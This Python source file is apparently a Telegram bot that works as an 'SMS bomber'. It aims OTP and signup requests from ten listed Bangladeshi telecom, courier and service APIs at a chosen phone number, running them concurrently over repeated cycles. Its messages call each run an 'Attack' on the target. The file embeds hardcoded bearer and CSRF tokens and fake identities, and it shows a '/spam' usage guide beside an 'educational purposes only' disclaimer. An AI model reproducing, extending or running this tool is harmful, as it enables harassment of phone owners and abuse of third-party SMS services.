#!/usr/bin/python3
import os
import json
import threading
import logging
import asyncio
import httpx
from flask import Flask, request
from telegram import Update, Bot
from telegram.ext import Dispatcher, CommandHandler, CallbackContext

# --- Configuration ---
TOKEN = os.environ.get('VERCEL_BOT_TOKEN')
if not TOKEN:
    raise ValueError("No VERCEL_BOT_TOKEN found. Please set it in your Vercel project settings.")

# --- Bot and Flask Setup ---
bot = Bot(token=TOKEN)
app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# --- USER AGENTS AND HEADERS (from original script) ---
lmnXuserAgent1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
lmnXuserAgent2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
lmnXaccessVersion1 = '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"'
lmnXaccessVersion2 = '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"'


# --- All 60 API Functions (Refactored for Async performance) ---
# Each function is now async and uses httpx's AsyncClient for non-blocking requests.

async def lmnXlija_1(client, number):
    try:
        headers = {'accept': 'application/json, text/plain, */*','origin': 'https://go.paperfly.com.bd','user-agent': lmnXuserAgent2,}
        json_data = {'full_name': 'Johny Singh','company_name': 'lmnxlija','email_address': 'lmnxlija9689@gmail.com','phone_number': number,}
        await client.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', headers=headers, json=json_data)
        return True
    except: return False

async def lmnXlija_2(client, number):
    try:
        headers = {'accept': 'application/json, text/plain, */*','origin': 'https://ghoorilearning.com','user-agent': lmnXuserAgent2,}
        json_data = {'mobile_no': number,}
        await client.post('https://api.ghoorilearning.com/api/auth/signup/otp', params={'_app_platform': 'web'}, headers=headers, json=json_data)
        return True
    except: return False
    
async def lmnXlija_3(client, number):
    try:
        headers = {'accept': '*/*','origin': 'https://doctime.com.bd','user-agent': lmnXuserAgent2,}
        json_data = {'data': {'country_calling_code': '88','contact_no': number,'headers': {'PlatForm': 'Web',},},}
        await client.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', headers=headers, json=json_data)
        return True
    except: return False

async def lmnXlija_4(client, number):
    try:
        headers = {'accept': '*/*','origin': 'https://customer.sundarbancourierltd.com','user-agent': lmnXuserAgent1,}
        json_data = {'operationName': 'CreateAccessToken','variables': {'accessTokenFilter': {'userName': number,},},'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n        message\n        statusCode\n        result {\n      phone\n      otpCounter\n      __typename\n        }\n        __typename\n  }\n}',}
        await client.post('https://api-gateway.sundarbancourierltd.com/graphql', headers=headers, json=json_data)
        return True
    except: return False

async def lmnXlija_5(client, number):
    try:
        headers = {'accept': 'application/json, text/plain, */*','origin': 'https://apex4u.com','user-agent': lmnXuserAgent1,}
        json_data = {'phoneNumber': number,}
        await client.post('https://api.apex4u.com/api/auth/login', headers=headers, json=json_data)
        return True
    except: return False

async def lmnXlija_6(client, number):
    try:
        headers = {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc","Content-Type": "application/json",}
        data = {"phone_number": number,"type": "doorstep"}
        await client.post("https://webapi.robi.com.bd/v1/send-otp", json=data, headers=headers)
        return True
    except: return False

async def lmnXlija_7(client, number):
    try:
        headers = {'Origin': 'https://banglalink.net','Referer': 'https://banglalink.net/','User-Agent': lmnXuserAgent1,}
        await client.get('https://web-api.banglalink.net/api/v1/user/number/validation/'+number, headers=headers)
        return True
    except: return False

async def lmnXlija_8(client, number):
    try:
        headers = {'Origin': 'https://banglalink.net','Referer': 'https://banglalink.net/','User-Agent': lmnXuserAgent1, 'client-security-token': '1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ',}
        json_data = {'mobile': number,}
        await client.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', headers=headers, json=json_data)
        return True
    except: return False

async def lmnXlija_9(client, number):
    try:
        headers = {'Origin': 'https://www.grameenphone.com','Referer': 'https://www.grameenphone.com/','User-Agent': lmnXuserAgent1,}
        data = {'msisdn': number,}
        await client.post('https://webloginda.grameenphone.com/backend/api/v1/otp', headers=headers, data=data)
        return True
    except: return False
        
async def lmnXlija_10(client, number):
    try:
        headers = {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI','Origin': 'https://www.robi.com.bd','Referer': 'https://www.robi.com.bd/','User-Agent': lmnXuserAgent1,'X-CSRF-TOKEN': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',}
        json_data = {'phone_number': number,'type': 'my_offer',}
        await client.post('https://webapi.robi.com.bd/v1/send-otp', headers=headers, json=json_data)
        return True
    except: return False
# ... (Continue this pattern for all 60 functions)

# [IMPORTANT: Paste ALL 60 of your lmnXlija functions here, refactored like the examples above]

# --- Master API List ---
ALL_APIS = [
    lmnXlija_1, lmnXlija_2, lmnXlija_3, lmnXlija_4, lmnXlija_5,
    lmnXlija_6, lmnXlija_7, lmnXlija_8, lmnXlija_9, lmnXlija_10,
    # ... and so on, up to lmnXlija_60
]

# --- Core Spam Logic (Async) ---
async def spam_task_async(number, amount, update: Update, context: CallbackContext):
    """
    This async function runs all API requests concurrently for maximum speed.
    """
    chat_id = update.effective_chat.id
    message = await context.bot.send_message(
        chat_id, 
        f"✅ Attack started on `+88{number}`.\n\nRunning `{amount}` cycles concurrently. Please wait..."
    )

    total_sms_sent = 0
    num_apis = len(ALL_APIS)

    # Use a single AsyncClient for all requests to reuse connections
    async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
        for i in range(amount):
            cycle = i + 1
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message.message_id,
                text=f"🔄 **Cycle:** `{cycle}/{amount}`\n\nStarting `{num_apis}` API requests...\nTotal SMS Sent: `{total_sms_sent}`"
            )

            # Create a list of tasks for all API calls in the current cycle
            tasks = [asyncio.create_task(api_func(client, number)) for api_func in ALL_APIS]
            
            # Run all tasks concurrently and wait for them to complete
            results = await asyncio.gather(*tasks)
            
            # Count successful results
            success_count = sum(1 for result in results if result is True)
            total_sms_sent += success_count

    # Final completion message
    await context.bot.edit_message_text(
        chat_id=chat_id,
        message_id=message.message_id,
        text=f"🎉 **Attack Finished!** 🎉\n\nTarget: `+88{number}`\nCycles Completed: `{amount}`\nTotal SMS Sent (Approx): `{total_sms_sent}`"
    )

def run_async_task(number, amount, update, context):
    """A synchronous wrapper to run our async task."""
    asyncio.run(spam_task_async(number, amount, update, context))

# --- Telegram Command Handlers ---
def start(update: Update, context: CallbackContext):
    """Handler for the /start command."""
    welcome_message = (
        "👋 **Welcome to the SAJIB0011 SMS Bot!**\n\n"
        "This tool is for educational purposes only.\n\n"
        "**Usage:**\n"
        "`/spam <phonenumber> <amount>`\n\n"
        "**Example:**\n"
        "`/spam 01700000000 5`\n\n"
        "This will start 5 cycles of spamming on the number `01700000000`."
    )
    context.bot.send_message(
        chat_id=update.effective_chat.id, text=welcome_message, parse_mode='Markdown'
    )

def spam_command(update: Update, context: CallbackContext):
    """Handler for the /spam command."""
    chat_id = update.effective_chat.id
    try:
        args = context.args
        if len(args) != 2:
            context.bot.send_message(chat_id, "❌ Invalid format. Use: `/spam <number> <amount>`")
            return

        number, amount_str = args
        if not (number.isdigit() and len(number) == 11 and number.startswith("01")):
            context.bot.send_message(chat_id, "❌ Invalid phone number. It must be a valid 11-digit Bangladeshi number.")
            return
        
        if not amount_str.isdigit() or not (1 <= int(amount_str) <= 10):
            context.bot.send_message(chat_id, "❌ Invalid amount. Please choose a number between 1 and 10.")
            return

        # Run the spam task in a separate thread to avoid blocking the webhook response
        threading.Thread(target=run_async_task, args=(number, int(amount_str), update, context)).start()

    except Exception as e:
        logging.error(f"Error in spam_command: {e}")
        context.bot.send_message(chat_id, "An unexpected error occurred.")

# --- Flask Webhook Route ---
@app.route('/', methods=['POST'])
def webhook():
    """Webhook endpoint to receive updates from Telegram."""
    try:
        dispatcher = Dispatcher(bot, None, workers=0)
        dispatcher.add_handler(CommandHandler('start', start))
        dispatcher.add_handler(CommandHandler('spam', spam_command, pass_args=True))
        
        update = Update.de_json(request.get_json(force=True), bot)
        dispatcher.process_update(update)
    except Exception as e:
        logging.error(f"Error in webhook: {e}")
    return 'ok'

@app.route('/health', methods=['GET'])
def health_check():
    return 'OK', 200

